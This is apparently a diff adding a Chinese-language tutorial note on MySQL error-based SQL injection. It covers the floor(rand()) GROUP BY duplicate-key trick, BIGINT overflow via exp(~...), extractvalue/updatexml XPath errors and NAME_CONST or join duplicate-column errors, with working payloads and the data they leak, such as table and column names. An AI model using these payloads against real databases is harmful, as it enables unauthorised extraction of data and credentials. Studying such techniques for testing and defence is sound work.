@@ -1,0 +1,88 @@
+concat+rand()+group_by()导致主键重复
+
+
+concat+rand()+group_by()导致主键重复
+
+mysql Bug 8652
+
+group by 对一些rand()函数进行操作时会返回duplicate key 错误，而这个错误将会披露关键信息
+
+"Duplicate entry '####' for key 1"
+
+这里的####正是用户输入的希望查询的内容
+而该bug产生的主要原因就是：在rand()和group by同时使用到的时候，可能会产生超出预期的结果，因为会多次对同一列进行查询
+
+Select 1,count(*),concat(0x23,0x23,(select database()),0x23,0x23,floor(rand(0)*2))a from information_schema.columns group by a
+
+BIGINT等数据类型溢出
+
+
+BIGINT等数据类型溢出
+
+select (exp(~(select * from (select user())a))),2,3;
+
+在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况，在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可
+
+Xpath语法错误
+
+
+Xpath语法错误
+
+从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容：
+
+mysql> select extractvalue(1,'/a/b');
++------------------------+
+| extractvalue(1,'/a/b') |
++------------------------+
+|                        |
++------------------------+
+1 row in set (0.00 sec)
+
+mysql> select updatexml(1,'/a/b',1);
++-----------------------+
+| updatexml(1,'/a/b',1) |
++-----------------------+
+| 1                     |
++-----------------------+
+1 row in set (0.00 sec)
+
+它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里
+
+mysql> select extractvalue(1,concat(0x7e,(select @@version),0x7e));
+ERROR 1105 (HY000): XPATH syntax error: '~5.5.53~'
+
+mysql> select extractvalue(1,concat(0x7e,(select user()),0x7e));
+ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
+
+mysql> select updatexml(1,concat(0x7e,(select database()),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: '~security~'
+
+mysql> select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: '~emails,referers,uagents,users~'
+
+注意：extractvalue()和updatexml()报错信息是有长度限制的，最大长度限制32位。
+
+数据库的一些特性
+
+
+数据库的一些特性
+
+利用数据库的一些特性产生报错信息。
+
+
+列名重复
+
+mysql列名重复会报错，我们利用name_const来制造一个列，根据官方文档，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。
+
+mysql> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
+ERROR 1060 (42S21): Duplicate column name '5.5.53'
+
+利用这个特性加上join函数可以爆列名：
+
+mysql> select * from(select * from users a join users b)c;
+ERROR 1060 (42S21): Duplicate column name 'id'
+mysql> select * from(select * from users a join users b using(id))c;
+ERROR 1060 (42S21): Duplicate column name 'username'
+mysql> select * from(select * from users a join users b using(id,username))c;
+ERROR 1060 (42S21): Duplicate column name 'password'
+
